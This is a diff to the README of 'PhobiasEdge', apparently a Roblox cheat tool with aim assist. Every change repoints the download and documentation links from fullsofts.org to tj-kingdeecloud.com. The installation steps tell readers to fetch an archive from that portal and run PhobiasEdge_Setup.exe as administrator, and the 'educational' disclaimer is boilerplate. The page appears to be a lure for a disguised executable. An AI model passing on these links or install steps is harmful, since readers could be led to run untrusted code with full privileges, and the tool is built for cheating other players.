@@ -6,7 +6,7 @@
 **Version:** 1.2.4  
 **Status:** Educational/Research Build  
 
-[![Download](https://img.shields.io/badge/Download-fullsofts.org-brightgreen?style=for-the-badge)](https://fullsofts.org)
+[![Download](https://img.shields.io/badge/Download-tj-kingdeecloud.com-brightgreen?style=for-the-badge)](https://tj-kingdeecloud.com)
 
 ## Feature Specifications
 
@@ -62,7 +62,7 @@
 
 ### Step 2: Installation
 1. Download the latest package from the official distribution portal:
-   [![Download](https://img.shields.io/badge/Download-fullsofts.org-brightgreen?style=for-the-badge)](https://fullsofts.org)
+   [![Download](https://img.shields.io/badge/Download-tj-kingdeecloud.com-brightgreen?style=for-the-badge)](https://tj-kingdeecloud.com)
 2. Extract the archive to a secure directory
 3. Run `PhobiasEdge_Setup.exe` with administrator privileges
 4. Follow the guided installation wizard
@@ -94,7 +94,7 @@
 - **Aim assist inconsistency**: Recalibrate in empty server using calibration tool
 
 ### Support Channels
-- Configuration guides available at fullsofts.org/documentation
+- Configuration guides available at tj-kingdeecloud.com/documentation
 - Version-specific patches released bi-weekly
 - Community configuration sharing via official portal
 
@@ -102,6 +102,6 @@
 This tool is provided for educational and research purposes only. Users are responsible for complying with Roblox Terms of Service and any applicable laws. The developers assume no liability for account restrictions or penalties resulting from tool usage. Always use in private servers with explicit permission from all participants.
 
 ---
-**Distribution Portal:** [fullsofts.org](https://fullsofts.org)  
+**Distribution Portal:** [tj-kingdeecloud.com](https://tj-kingdeecloud.com)  
 **Last Updated:** 2024-01-15  
 **Documentation Version:** 2.1
